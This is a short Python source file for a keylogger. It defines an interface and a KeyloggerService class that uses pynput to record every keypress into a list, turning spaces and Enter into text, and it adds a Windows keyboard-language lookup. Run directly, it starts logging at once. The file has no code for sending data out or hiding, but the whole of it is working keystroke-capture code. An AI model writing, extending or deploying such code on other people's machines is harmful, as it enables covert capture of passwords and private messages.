from abc import ABC, abstractmethod
from typing import List
from pynput.keyboard import  Listener
import ctypes
import locale



class IKeyLogger(ABC):

  @abstractmethod
  def start_logging(self) -> None:
   pass

  @abstractmethod
  def stop_logging(self) -> None:
   pass

  @abstractmethod
  def get_logged_keys(self) -> List[str]:
   pass



class KeyloggerService(IKeyLogger):
    """""
    abstract class for start capture preses and stop methods
    and return logg keys
    """""

    def __init__(self):
        self.keys = []
        self.listener = None


    def on_press(self,key):
        k = str(key).replace("'", "")
        if k == "Key.space":
            self.keys.append(" ")
        elif k == "Key.enter":
            self.keys.append("\n")
        elif "Key" not in k:
            self.keys.append(k)
        # print(f"Key pressed: {k}")


    def start_logging(self):
        if self.listener is None:
            self.listener = Listener(on_press=self.on_press)
            self.listener.start()





    def stop_logging(self) -> None:
        if self.listener is not None:
            self.listener.stop()
            self.listener = None





    def get_logged_keys(self) -> List[str]:
        return list(self.keys)


    @staticmethod
    def get_current_language():
        layout = ctypes.windll.user32.GetKeyboardLayout(0)
        lang_id = layout & 0xFFFF
        try:
            return locale.windows_locale[lang_id]
        except KeyError:
            raise KeyError(f"Unknown language ID: 0x{lang_id:X}")


if __name__ == "__main__":

    keylogger = KeyloggerService()
    keylogger.start_logging()




























